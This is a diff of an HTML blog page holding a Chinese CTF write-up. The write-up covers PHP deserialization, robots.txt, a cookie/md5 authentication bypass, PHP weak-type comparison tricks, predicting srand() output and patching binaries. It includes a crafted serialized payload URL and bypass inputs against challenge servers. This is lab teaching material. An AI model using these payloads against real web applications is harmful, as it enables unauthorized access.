@@ -309,12 +309,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/ctf/" target="_blank">
-                                <span class="chip bg-color">ctf</span>
-                            </a>
-                        
                             <a href="/tags/web/" target="_blank">
                                 <span class="chip bg-color">web</span>
+                            </a>
+                        
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
                             </a>
                         
                             <a href="/tags/reverse/" target="_blank">
@@ -348,14 +348,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        3.4k
+                        2.6k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        16 分
+                        11 分
                     </div>
                     
                 
@@ -378,7 +378,7 @@
 </code></pre>
 <h2 id="serialization-1"><a href="#serialization-1" class="headerlink" title="serialization-1"></a>serialization-1</h2><p>php反序列化，，，记得当初第一次参见CTF的时候就是这道题不会做，导致就差这一道题没能拿奖</p>
 <p>题目地址： <a href="http://47.93.249.236:10009/index.php" target="_blank" rel="noopener">http://47.93.249.236:10009/index.php</a> </p>
-<pre class=" language-lang-php"><code class="language-lang-php"><!--?php
+<pre class=" language-lang-php"><code class="language-lang-php"><?php
 error_reporting(0);
 class Test
 {
@@ -386,7 +386,7 @@ class Test
 
     public function __destruct()
     {
-        if($this--->a != 'nothing') {
+        if($this->a != 'nothing') {
 
             highlight_file('flag.php');
         }
@@ -402,7 +402,7 @@ if(isset($_GET['data'])) {
 else {
     highlight_file(__FILE__);
 }
-    ?&gt;
+    ?>
 </code></pre>
 <p>题目给了源代码，从代码中我们可以看出来，我们要拿到flag的话，必须让 <strong>a ! =’nothing’</strong></p>
 <p>但是 <strong>a</strong> 在声明的时候已经等于 <strong>nothing</strong> 了</p>
@@ -414,7 +414,7 @@ else {
 <p> <strong>将已序列化的字符串变回 PHP 的值</strong> </p>
 <p>这就很清晰明了了</p>
 <p>我们可以通过data传入一个已经序列化的字符串来覆盖掉 <strong>a</strong> 的值</p>
-<pre class=" language-lang-php"><code class="language-lang-php"><!--?php
+<pre class=" language-lang-php"><code class="language-lang-php"><?php
 
     class Test{
     private $a = "666";
@@ -422,7 +422,7 @@ else {
     $flag = new Test();
     print_r(serialize($flag));
 
-?-->
+?>
 </code></pre>
 <p>执行这段代码后得到</p>
 <pre class=" language-lang-php"><code class="language-lang-php">O:4:"Test":1:{s:7:"Testa";s:3:"666";}
@@ -437,9 +437,9 @@ else {
 <pre class=" language-lang-txt"><code class="language-lang-txt">http://47.93.249.236:10009/index.php?data=O:4:%22Test%22:1:{s:7:%22%00Test%00a%22;s:3:%22666%22;}
 </code></pre>
 <p>访问得到 <strong>flag</strong></p>
-<pre class=" language-lang-php"><code class="language-lang-php"><!--?php
+<pre class=" language-lang-php"><code class="language-lang-php"><?php
 $flag = 'flag{0030-0571-8890-4673}';
-?-->
+?>
 </code></pre>
 <h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><p>这道题从名字上就可以知道（zuo ti zuo duo le jiu ke yi zhi dao）,关键在<strong>robots.txt</strong> 上，一般情况下网站都会有这个文件，他的主要功能就和他的文件内容 一样清晰明了</p>
 <pre class=" language-lang-txt"><code class="language-lang-txt">User-agent: *
@@ -561,7 +561,7 @@ if __name__ == '__main__':
 <pre class=" language-lang-php"><code class="language-lang-php">function ctt($key)
 {
     $t="";
-    for($i=0;$i &lt; strlen($key) ; ++$i)
+    for($i=0;$i < strlen($key) ; ++$i)
     {
         $t.=chr(ord($key[$i])^$i);
     }
@@ -572,7 +572,7 @@ $role1 = "xxxxxxxxx";
 $salt = "xxxxxxxxxx";//长度不超过15
 if (isset($_COOKIE["role_true"])) {
       $hsh = $_COOKIE["hsh"];
-      if ($_COOKIE["role_true"] === $role1 &amp;&amp; $hsh   ===md5($salt.urldecode($_COOKIE["role"]))) {
+      if ($_COOKIE["role_true"] === $role1 && $hsh   ===md5($salt.urldecode($_COOKIE["role"]))) {
     $auth = true;
 } else {
     $auth = false;
@@ -590,7 +590,7 @@ if (isset($_COOKIE["role_true"])) {
  }
 </code></pre>
 <p>从代码中我们可以看出，我们要想输出 <strong>flag</strong> 必须要满足</p>
-<pre class=" language-lang-php"><code class="language-lang-php">$_COOKIE["role_true"] === $role1 &amp;&amp; $hsh === md5($salt.urldecode($_COOKIE["role"]))
+<pre class=" language-lang-php"><code class="language-lang-php">$_COOKIE["role_true"] === $role1 && $hsh === md5($salt.urldecode($_COOKIE["role"]))
 </code></pre>
 <p>通过F12查看源代码 我们可以得到 </p>
 <pre class=" language-lang-txt"><code class="language-lang-txt">role=YVPweR3oRN%3B%7Bnj32
@@ -645,7 +645,7 @@ else {
 </code></pre>
 <pre class=" language-lang-php"><code class="language-lang-php">f1=0 f1!==0
 </code></pre>
-<pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&amp;&amp;f2=0
+<pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&&f2=0
 </code></pre>
 <p>但实际过程发现，我们只要让</p>
 <pre class=" language-lang-php"><code class="language-lang-php">f1=0abc //php是弱类型语言，会将 '0abc'看成 '0'
@@ -659,7 +659,7 @@ else {
 <pre class=" language-lang-php"><code class="language-lang-php">f3[]=0
 </code></pre>
 <p>来绕过</p>
-<pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&amp;&amp;f2=0
+<pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&&f2=0
 </code></pre>
 <p>可能是出题人疏忽了…,或者我想多了….</p>
 <pre class=" language-lang-txt"><code class="language-lang-txt">flag{Due_to_weak_type:)}
@@ -725,7 +725,7 @@ int main(){
   v9 = rand() % 10520;
   v10 = v8 + v7 + v6 + v9;
   printf("Input your key:", argv);
-  __isoc99_scanf("%ld", &amp;v5);
+  __isoc99_scanf("%ld", &v5);
   if ( v10 == v5 )
     printf("flag{cdusec_wsj_%ld}", v5);
   else
@@ -735,7 +735,7 @@ int main(){
 
   return 0;
 }
-</studio.h></code></pre>
+</code></pre>
 <p>大概就是我们需要输入一个数，并且这个数要等于<strong>v10</strong> 也就是四个随机的数相加</p>
 <p>我们发现<strong>srand()</strong>函数中只有一个参数</p>
 <p>众所周知，当<strong>srand()</strong> 函数里只有一个参数的时候会生成伪随机数</p>
@@ -755,7 +755,7 @@ int main(){
     printf("%ld",result);
     return 0
 }
-</stdio.h></code></pre>
+</code></pre>
 <p>值得一提的是这个程序在linux下运行和在windows下运行结果是不一样的</p>
 <p>命令：</p>
 <pre class=" language-lang-txt"><code class="language-lang-txt">gcc -o flag flag.c
@@ -808,7 +808,7 @@ print(c)
 
   v3 = 1;
   printf(Format);
-  scanf(aS, &amp;v6);
+  scanf(aS, &v6);
   v4 = 0;
   do
   {
@@ -816,21 +816,21 @@ print(c)
       goto LABEL_9;
     if ( !(v4 / 4) )
     {
-      if ( *(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251 )
+      if ( *(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) == 1937073251 )
         goto LABEL_9;
 LABEL_8:
       v3 = 0;
       goto LABEL_9;
     }
-    if ( v4 / 4 == 1 &amp;&amp; *(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) != 1701995365 )
+    if ( v4 / 4 == 1 && *(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) != 1701995365 )
       goto LABEL_8;
 LABEL_9:
     ++v4;
   }
-  while ( v4 &lt; 8 );
+  while ( v4 < 8 );
   if ( v3 == 1 )
   {
-    printf(aFlagS_1, &amp;v6);
+    printf(aFlagS_1, &v6);
     result = system(Command);
   }
   else
@@ -842,10 +842,10 @@ LABEL_9:
 }
 </code></pre>
 <p>发现flag的前四位要满足</p>
-<pre class=" language-lang-c"><code class="language-lang-c">*(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251
+<pre class=" language-lang-c"><code class="language-lang-c">*(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) == 1937073251
 </code></pre>
 <p>后四位要满足</p>
-<pre class=" language-lang-c"><code class="language-lang-c">*(&amp;v6 + v4) + ((*(&amp;v7 + v4) + ((*(&amp;v8 + v4) + (v9[v4] &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) != 1701995365
+<pre class=" language-lang-c"><code class="language-lang-c">*(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) != 1701995365
 </code></pre>
 <p>也就是说flag总共有8位</p>
 <p>先来一手猜flag</p>
@@ -857,8 +857,8 @@ LABEL_9:
 </code></pre>
 <p>开个玩笑，这题还是要写脚本的</p>
 <p>取出表达式</p>
-<pre class=" language-lang-c"><code class="language-lang-c">v1 + (( v2 + ((v3 + (v4 &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251
-v5 + (( v6 + ((v7 + (v8 &lt;&lt; 8)) &lt;&lt; 8)) &lt;&lt; 8) == 1937073251
+<pre class=" language-lang-c"><code class="language-lang-c">v1 + (( v2 + ((v3 + (v4 << 8)) << 8)) << 8) == 1937073251
+v5 + (( v6 + ((v7 + (v8 << 8)) << 8)) << 8) == 1937073251
 </code></pre>
 <pre class=" language-lang-python"><code class="language-lang-python">flag='qwertyuiopasdfghjklzxcvbnm'
 def run(number):
@@ -882,7 +882,7 @@ run()
   void *lpMem; // [sp+4h] [bp-4h]@1
 
   lpMem = (void *)sub_4015F2(1, ++dword_4A32C0);
-  v1 = (unsigned __int8 *)sub_40121B((unsigned int)&amp;unk_480B5F);
+  v1 = (unsigned __int8 *)sub_40121B((unsigned int)&unk_480B5F);
   if ( lpMem )
     sub_4015FE(lpMem);
   result = sub_4015F8((HWND)0x52010001, 100728832, 8, -1, v1, 0);
@@ -921,7 +921,7 @@ run()
     sub_4015F2(2, 1);
   if ( dword_4A32C4 == 5 )
     sub_4015F2(2, 1);
-  result = dword_4A32C4 &gt; 5 &amp;&amp; dword_4A32C4 &lt; 18;//不难发现这个是判断flag{}括号里的字符数的
+  result = dword_4A32C4 > 5 && dword_4A32C4 < 18;//不难发现这个是判断flag{}括号里的字符数的
   if ( result )
   {
     v1 = sub_4015F2(2, 1);
@@ -932,7 +932,7 @@ run()
   }
   if ( dword_4A32C4 == 18 )
     result = sub_4015F2(2, 1);
-  if ( dword_4A32C4 &gt; 10 ) //这个函数是把flag给变成*****的
+  if ( dword_4A32C4 > 10 ) //这个函数是把flag给变成*****的
     result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);
   ++dword_4A32C4;
   return result;
@@ -949,7 +949,7 @@ run()
 <p>就会出来一个flag字符</p>
 <p>但当字符数达到10个以上的时候flag就会变成<em>*</em></p>
 <p>猜测</p>
-<pre class=" language-lang-c"><code class="language-lang-c">  if ( dword_4A32C4 &gt; 10 ) //这个函数是把flag给变成*****的
+<pre class=" language-lang-c"><code class="language-lang-c">  if ( dword_4A32C4 > 10 ) //这个函数是把flag给变成*****的
     result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);
   ++dword_4A32C4;
 </code></pre>
@@ -960,7 +960,7 @@ run()
 <pre class=" language-lang-txt"><code class="language-lang-txt">.text:00401549                 jge     loc_40156C
 </code></pre>
 <p>也就是把判断条件改为了</p>
-<pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C4 &lt; 10
+<pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C4 < 10
 </code></pre>
 <p>因为现在我们的字符数已经大于10了，所以</p>
 <pre class=" language-lang-c"><code class="language-lang-c">result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);
@@ -1203,7 +1203,7 @@ int __cdecl main(int argc, const char **argv, const char **envp</div>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">33.2k</span>
+                <span class="white-color">48k</span>
             
 
             
